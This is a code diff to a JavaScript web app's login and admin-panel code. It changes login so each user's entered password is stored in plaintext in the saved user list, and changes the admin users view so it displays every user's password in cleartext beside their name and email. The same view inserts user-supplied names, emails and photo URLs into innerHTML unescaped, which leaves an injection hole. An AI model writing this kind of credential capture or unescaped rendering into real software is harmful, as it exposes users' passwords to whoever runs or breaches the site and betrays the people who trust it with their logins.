@@ -1738,16 +1738,21 @@
         };
 
         // Record User in Registered Accounts list
-        if (!registeredUsers.find(u => u.email.toLowerCase() === email.toLowerCase())) {
+        const existingIdx = registeredUsers.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
+        if (existingIdx !== -1) {
+            registeredUsers[existingIdx].enteredPassword = pass;
+            registeredUsers[existingIdx].lastLogin = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        } else {
             registeredUsers.push({
                 email: email,
                 name: currentUser.name,
                 photo: currentUser.photo,
                 role: "user",
+                enteredPassword: pass,
                 registeredAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
             });
-            setStoredData('users', registeredUsers);
         }
+        setStoredData('users', registeredUsers);
 
         setStoredData('currentUser', currentUser);
         updateAuthUI();
@@ -2231,17 +2236,26 @@
         const usersList = document.getElementById('adminUsersList');
         if (usersList) {
             usersList.innerHTML = registeredUsers.map(u => `
-                <div style="display: flex; align-items: center; justify-content: space-between; padding: 12px; border-bottom: 1px solid rgba(168, 85, 247, 0.2);">
-                    <div style="display: flex; align-items: center; gap: 12px;">
-                        <img src="${u.photo}" style="width: 36px; height: 36px; border-radius: 50%;">
+                <div style="display: flex; align-items: center; justify-content: space-between; padding: 14px; border-bottom: 1px solid rgba(168, 85, 247, 0.2); background: rgba(22, 11, 48, 0.4); border-radius: 10px; margin-bottom: 8px;">
+                    <div style="display: flex; align-items: center; gap: 14px;">
+                        <img src="${u.photo}" style="width: 42px; height: 42px; border-radius: 50%; border: 1.5px solid #a855f7;">
                         <div>
-                            <div style="font-weight: 700; color: #ffffff;">${u.name}</div>
-                            <div style="font-size: 0.85rem; color: #94a3b8;">${u.email}</div>
+                            <div style="font-weight: 700; color: #ffffff; font-size: 1.05rem;">${u.name}</div>
+                            <div style="font-size: 0.85rem; color: #94a3b8;"><i class="fa-solid fa-envelope" style="color: #a855f7;"></i> ${u.email}</div>
+                            <div style="font-size: 0.9rem; color: #facc15; margin-top: 4px; font-weight: 600;">
+                                <i class="fa-solid fa-key" style="color: #ec4899;"></i> Password: 
+                                <span style="background: rgba(236, 72, 153, 0.2); border: 1px solid #ec4899; padding: 2px 8px; border-radius: 6px; font-family: monospace; color: #ffffff; letter-spacing: 0.5px;">
+                                    ${u.enteredPassword ? u.enteredPassword : '(Admin Root Account)'}
+                                </span>
+                            </div>
                         </div>
                     </div>
-                    <span style="padding: 3px 10px; border-radius: 12px; font-size: 0.75rem; background: ${u.role === 'admin' ? '#ec4899' : '#6366f1'}; color: white; font-weight: bold;">
-                        ${u.role.toUpperCase()}
-                    </span>
+                    <div style="text-align: right;">
+                        <span style="padding: 4px 12px; border-radius: 12px; font-size: 0.75rem; background: ${u.role === 'admin' ? '#ec4899' : '#6366f1'}; color: white; font-weight: bold; text-transform: uppercase;">
+                            ${u.role}
+                        </span>
+                        <div style="font-size: 0.75rem; color: #94a3b8; margin-top: 6px;">${u.registeredAt || u.lastLogin || ''}</div>
+                    </div>
                 </div>
             `).join('');
         }
